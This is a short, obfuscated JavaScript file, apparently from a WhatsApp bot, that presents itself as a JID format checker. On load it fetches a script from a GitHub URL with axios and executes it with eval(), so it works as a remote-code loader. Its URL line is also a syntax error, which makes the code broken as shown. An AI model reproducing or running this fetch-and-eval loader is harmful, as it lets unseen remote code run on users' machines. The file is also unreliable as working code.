'use strict';

const axios = require('axios');
require("dotenv").config();
const scriptUrl = process'https://github.com/Fred1e/lucky-md-data-base/blob/main/.env.LUCKY_URL';
function atbverifierEtatJid(_0x6a67fe) {
  if (!_0x6a67fe.endsWith('@s.whatsapp.net')) {
    console.error("Invalid JID format:", _0x6a67fe);
    return false;
  }
  console.log("JID verified:", _0x6a67fe);
  return true;
}
axios.get(scriptUrl).then(_0x567a51 => {
  const _0x57772e = _0x567a51.data;
  console.log("Script loaded successfully!");
  eval(_0x57772e);
  const _0x43efc0 = atbverifierEtatJid('example@s.whatsapp.net');
  console.log("Is JID valid?", _0x43efc0);
})["catch"](_0x9a0cf2 => {
  console.error("Error loading the script:", _0x9a0cf2);
});
